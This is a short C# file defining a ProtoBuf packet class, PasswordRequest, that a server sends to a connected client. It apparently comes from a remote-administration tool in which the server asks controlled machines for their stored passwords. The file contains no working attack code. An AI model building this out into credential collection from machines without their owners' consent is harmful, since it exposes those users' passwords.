using ProtoBuf;
using System;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class PasswordRequest : IPacket
    {
        public PasswordRequest()
        {
        }
        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
